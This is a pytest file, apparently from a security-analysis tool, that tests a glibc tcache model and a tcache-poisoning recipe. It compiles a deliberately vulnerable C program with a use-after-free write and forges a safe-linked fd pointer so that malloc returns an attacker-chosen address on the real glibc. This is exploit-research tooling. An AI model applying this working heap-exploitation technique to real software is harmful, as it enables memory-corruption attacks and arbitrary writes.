"""Phase 9 (frontier) — heap-layout primitives: glibc tcache model + tcache poisoning."""
from __future__ import annotations

import os
import re
import select
import subprocess
import time

import pytest

from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import heap

# tcache playground: drive malloc/free and a UAF fd-write via stdin; print chunk addresses.
_PLAY = r"""
#include <stdio.h>
#include <stdlib.h>
static void* chunks[64];
char win_target[64] __attribute__((aligned(16)));
int main(void){
  setvbuf(stdout,NULL,_IONBF,0);
  char line[128];
  printf("win_target=%p\n",(void*)win_target);
  while(fgets(line,sizeof line,stdin)){
    char op; unsigned idx; unsigned long a,b;
    if(sscanf(line," %c",&op)!=1) continue;
    if(op=='a'){ sscanf(line," a %lu %u",&a,&idx); chunks[idx]=malloc(a); printf("alloc[%u]=%p\n",idx,chunks[idx]); }
    else if(op=='f'){ sscanf(line," f %u",&idx); free(chunks[idx]); }
    else if(op=='w'){ sscanf(line," w %u %lx",&idx,&b); *(unsigned long*)chunks[idx]=b; }
    else if(op=='q'){ break; }
  }
  return 0;
}
"""


def test_request2size_and_index():
    assert heap.request2size(24) == 0x20 and heap.request2size(0x18) == 0x20
    assert heap.request2size(40) == 0x30 and heap.request2size(0) == 0x20
    assert heap.tcache_index(0x20) == 0 and heap.tcache_index(0x30) == 1
    assert heap.in_tcache_range(0x20) and not heap.in_tcache_range(0x800)


def test_safe_linking_roundtrip():
    a, target = 0x556417f13320, 0x55640be0d060
    assert heap.demangle(a, heap.mangle(a, target)) == target
    assert heap.mangle(a, target) != target            # actually mangled


def test_model_lifo_reuse():
    m = heap.TcacheModel(base=0x10000)
    a = m.malloc(24); b = m.malloc(24)
    assert b != a
    m.free(b); m.free(a)                                # tcache head = a (LIFO)
    assert m.malloc(24) == a                            # last freed comes back first
    assert m.malloc(24) == b


def test_model_tcache_poison_returns_target():
    m = heap.TcacheModel(base=0x10000)
    a = m.malloc(24); b = m.malloc(24)
    m.free(b); m.free(a)
    m.write_fd(a, 0xCAFEF00D000)                        # UAF: forge A's fd -> target
    assert m.malloc(24) == a
    assert m.malloc(24) == 0xCAFEF00D000                # arbitrary allocation


def test_poison_recipe_shape():
    r = heap.tcache_poison_recipe(24)
    assert r["ok"] and r["chunk_size"] == 0x20
    ops = [o[0] for o in r["ops"]]
    assert ops == ["alloc", "alloc", "free", "free", "write_fd", "alloc", "alloc"]
    assert r["mangle"] is heap.mangle


# --------------------------------------------------------- live: real glibc tcache poison
@pytest.fixture
def play_bin(gcc, tmp_path_factory):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("tcache poisoning test is x86-64 native only")
    d = tmp_path_factory.mktemp("heap")
    c = d / "h.c"; c.write_text(_PLAY)
    out = d / "h"
    if subprocess.run([gcc, "-O0", str(c), "-o", str(out)], capture_output=True).returncode != 0:
        pytest.skip("cannot build heap playground")
    return out


def _drive(p, data):
    p.stdin.write(data); p.stdin.flush()
    out = b""
    while select.select([p.stdout], [], [], 0.4)[0]:
        c = os.read(p.stdout.fileno(), 4096)
        if not c:
            break
        out += c
    return out.decode("latin-1", "ignore")


def test_tcache_poison_on_real_glibc(play_bin):
    """Lykos's model computes the safe-linking mangle + recipe; verify the poisoned allocation
    actually returns the attacker-chosen address on the host's real glibc."""
    p = subprocess.Popen([str(play_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        banner = _drive(p, b"")
        win = int(re.search(r"win_target=0x([0-9a-f]+)", banner).group(1), 16)
        a0 = int(re.search(r"alloc\[0\]=0x([0-9a-f]+)", _drive(p, b"a 24 0\n")).group(1), 16)
        mangled = heap.mangle(a0, win)                 # the model's safe-linked fd value
        _drive(p, b"a 24 1\nf 1\nf 0\n")               # per the recipe (LIFO head -> chunk 0)
        _drive(p, ("w 0 %x\n" % mangled).encode())     # UAF: forge chunk0.fd -> win_target
        out = _drive(p, b"a 24 2\na 24 3\n")           # alloc -> chunk0 ; alloc -> win_target
        got = int(re.search(r"alloc\[3\]=0x([0-9a-f]+)", out).group(1), 16)
        assert got == win                              # arbitrary allocation achieved
    finally:
        try:
            p.stdin.write(b"q\n"); p.stdin.flush()
            p.wait(timeout=3)
        except Exception:
            p.kill()
